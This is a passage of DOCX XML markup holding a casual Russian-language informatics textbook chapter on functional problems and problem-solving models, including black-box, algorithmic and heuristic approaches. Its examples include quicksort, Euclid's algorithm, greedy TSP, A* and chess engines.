        <w:t>Аналитическая или имитационная?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Зависит от сложности системы.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Детерминированная или стохастическая?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Зависит от наличия случайности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Математические модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это мощнейший инструмент. От простых алгебраических уравнений до дифференциальных уравнений, от статистических моделей до теории игр — всё это используется в реальной жизни: прогноз погоды, рекомендации YouTube, оптимизация логистики, оценка рисков инвестиций, разработка игр, искусственный интеллект.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Главное:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Не зубри формулы, а </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>понимай идею</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> каждой модели. Когда столкнёшься с реальной задачей, ты должен понимать, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>какой инструмент взять</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — линейную регрессию, дифференциальное уравнение, симуляцию Монте-Карло или граф.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В следующей главе (4.4) мы поговорим о </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>моделях решения функциональных задач</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>системном подходе</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Следующая глава:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4.4 Модели решения функциональных задач. Системный подход  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Предыдущая глава:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4.2 Информационные модели. Моделирование процессов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 4.4: Модели решения функциональных задач. Системный подход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Итак, мы с тобой уже прошли три главы про моделирование. Узнали, что такое модели (4.2), разобрались с классификацией моделирования и математическими моделями (4.3), посмотрели на жизненный цикл БД (4.1). Теперь самое время ответить на практический вопрос: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как, блин, решать задачи?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Потому что понимать, что такое граф или дифференциальное уравнение — это хорошо. Но когда перед тобой реальная задача типа "оптимизируй маршрут доставки для 50 курьеров", ты должен понимать, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>какую модель взять</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>какой метод применить</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4.2** (Информационные модели) — там мы разбирались, как моделировать процессы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4.3** (Классификация моделирования) — там были математические модели, теория графов, оптимизация</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 5.1** (Алгоритмы и их свойства) — алгоритмы = модели решения задач</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 5.2** (Алгоритмические конструкции) — там будут конкретные конструкции (циклы, ветвления)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем это нужно?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Потому что на экзамене могут спросить: "Что такое функциональная задача?", "В чём суть системного подхода?", "Чем отличается жадный алгоритм от динамического программирования?". А ещё потому что это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>реально полезно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — эти методы используются везде: от логистики до машинного обучения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4.1. Понятие функциональной задачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Что такое функциональная задача?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Функциональная задача (functional problem)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это задача с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>чётко определённой целью</w:t>
      </w:r>
      <w:r>
        <w:t>, входными данными и ожидаемым результатом. По сути, это "чёрный ящик": есть вход, есть выход, а внутри — процесс преобразования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формальное определение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Задача = (Вход, Процесс, Выход)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры функциональных задач:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача сортировки**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вход: неупорядоченный массив `[5, 2, 9, 1, 5, 6]`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процесс: сортировка (алгоритм быстрой сортировки, пузырьковая, и т.д.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выход: упорядоченный массив `[1, 2, 5, 5, 6, 9]`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача поиска пути**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вход: граф дорог, начальная точка A, конечная точка B</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процесс: алгоритм Дейкстры (поиск кратчайшего пути)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выход: последовательность рёбер от A до B с минимальной длиной</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача распознавания лиц**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вход: фотография</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процесс: нейросеть (свёрточная CNN)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выход: имя человека или "неизвестен"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача рекомендаций**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вход: история просмотров пользователя на YouTube</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процесс: алгоритм коллаборативной фильтрации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выход: список рекомендованных видео</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Не функциональные задачи (плохо формализованные):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Сделать сайт красивым" (что значит "красивым"? субъективно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Улучшить производительность системы" (на сколько? какие метрики?)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Написать хороший код" (что такое "хороший"?)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Функциональная задача должна иметь </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>чёткие критерии успеха</w:t>
      </w:r>
      <w:r>
        <w:t>. Если критериев нет — это не задача, а философия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4.2. Модели решения задач</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Есть несколько базовых моделей, которые описывают </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как вообще решать задачи</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Модель "чёрного ящика" (Black Box Model)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Не важно, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> работает система внутри. Важно только </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>что</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> она делает: вход → выход.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[ВХОД] → [🔲 ЧЁРНЫЙ ЯЩИК] → [ВЫХОД]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Калькулятор:** вводишь `2 + 2`, он выдаёт `4`. Тебе не важно, умножает ли он двойки на сложение или использует таблицу.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**API сервиса:** отправляешь запрос `GET /weather?city=Moscow`, получаешь JSON с погодой. Как сервер это делает — твоя проблема? Нет.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Нейросеть:** подаёшь изображение кота, она выдаёт "кот 95%". Что там происходит внутри — чёрная магия (ну ладно, свёртки и активации, но ты понял суть).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Простота (не нужно понимать детали)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Абстракция (можно заменить реализацию без изменения интерфейса)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Невозможно оптимизировать (если ящик медленный, ты не знаешь, где узкое место)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Невозможно отладить (если результат неверный, хз где ошибка)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Когда решение уже существует, и тебе нужно только использовать его (библиотеки, API, готовые сервисы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Алгоритмическая модель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Решение задачи описывается </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пошаговым алгоритмом</w:t>
      </w:r>
      <w:r>
        <w:t>. Каждый шаг явно прописан, последовательность действий чёткая.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Алгоритм поиска максимума в массиве</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Взять первый элемент массива, запомнить как max</w:t>
        <w:br/>
        <w:t>2. Для каждого следующего элемента:</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Если элемент &gt; max, то max = элемент</w:t>
        <w:br/>
        <w:t>3. Вернуть max</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Алгоритм Евклида (наибольший общий делитель)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>НОД(a, b):</w:t>
        <w:br/>
        <w:t>1. Если b = 0, то вернуть a</w:t>
        <w:br/>
        <w:t>2. Иначе вернуть НОД(b, a mod b)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3: Алгоритм быстрой сортировки (QuickSort)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Выбрать опорный элемент (pivot)</w:t>
        <w:br/>
        <w:t>2. Разделить массив на две части:</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Элементы &lt; pivot (левая часть)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Элементы ≥ pivot (правая часть)</w:t>
        <w:br/>
        <w:t>3. Рекурсивно отсортировать левую и правую части</w:t>
        <w:br/>
        <w:t>4. Объединить: левая + pivot + правая</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Детерминированность (результат предсказуем)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Возможность анализа (можно посчитать сложность O(n), O(n log n))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Воспроизводимость (одинаковый вход → одинаковый выход)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для некоторых задач точного алгоритма не существует (например, задача коммивояжёра для больших графов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Может быть медленным (если алгоритм неоптимальный)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Когда задача хорошо формализована и существует точный алгоритм.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Эвристическая модель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Используем </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>приближённые методы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (эвристики), которые не гарантируют точного решения, но дают </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>достаточно хорошее</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> за разумное время.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эвристика (heuristic)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это "правило большого пальца" (rule of thumb), опытное знание, которое часто работает, но не всегда оптимально.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда нужны эвристики?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Задача слишком сложная (NP-трудная), точное решение требует миллионы лет</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не нужно идеальное решение, достаточно "хорошего"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Время ограничено (например, игра в шахматы — нельзя перебрать все возможные ходы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Задача коммивояжёра (TSP)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Коммивояжёр должен посетить 10 городов и вернуться в начальную точку. Найти кратчайший маршрут.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Точное решение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Перебрать все возможные маршруты (10! = 3 628 800 вариантов). Для 20 городов уже 20! ≈ 2.4 × 10¹⁸ вариантов (компьютер будет считать тысячи лет).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эвристика "жадный алгоритм":</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Начать с текущего города</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Перейти в ближайший непосещённый город</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Повторять, пока все города не посещены</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Вернуться в начальную точку</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Не обязательно самый короткий маршрут, но достаточно хороший (обычно в пределах 10-20% от оптимума).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Алгоритм A\* для поиска пути</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти путь на карте от точки A до точки B (например, навигатор).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эвристика:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Оценка расстояния до цели (например, по прямой линии). Алгоритм A\* приоритизирует пути, которые ближе к цели (эвристическая функция `h(n)`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найденный путь оптимален (если эвристика допустима), но работает быстрее, чем полный перебор.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3: Шахматный движок</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Выбрать лучший ход в шахматах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Точное решение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Перебрать все возможные продолжения до конца партии (невозможно, дерево игры огромно).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эвристика:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Оценка позиции (материал, контроль центра, безопасность короля) + поиск на глубину 10-15 ходов (алгоритм минимакс с альфа-бета отсечением).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Достаточно сильная игра (движки уровня Stockfish обыгрывают чемпионов мира).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы эвристик:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Быстро (работает за разумное время)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Практично (лучше "хорошее" решение сейчас, чем "идеальное" через 1000 лет)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не гарантирует оптимум</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Может застрять в локальном минимуме (нашёл хорошее решение, но не лучшее)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Когда точное решение невозможно или слишком дорого, но нужен практический результат.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Оптимизационная модель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
